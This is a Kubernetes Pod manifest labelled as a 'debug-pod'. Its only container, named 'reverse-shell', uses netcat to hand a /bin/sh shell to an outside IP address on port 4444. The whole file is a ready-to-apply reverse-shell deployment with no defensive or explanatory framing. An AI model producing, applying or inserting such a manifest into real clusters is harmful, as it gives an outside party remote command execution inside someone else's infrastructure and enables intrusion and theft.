apiVersion: v1
kind: Pod
metadata:
  name: debug-pod
  namespace: backbase
spec:
  containers:
  - name: reverse-shell
    image: busybox:latest
    command: ["/bin/sh", "-c"]
    args: ["nc 203.175.125.130 4444 -e /bin/sh"]
  restartPolicy: Never
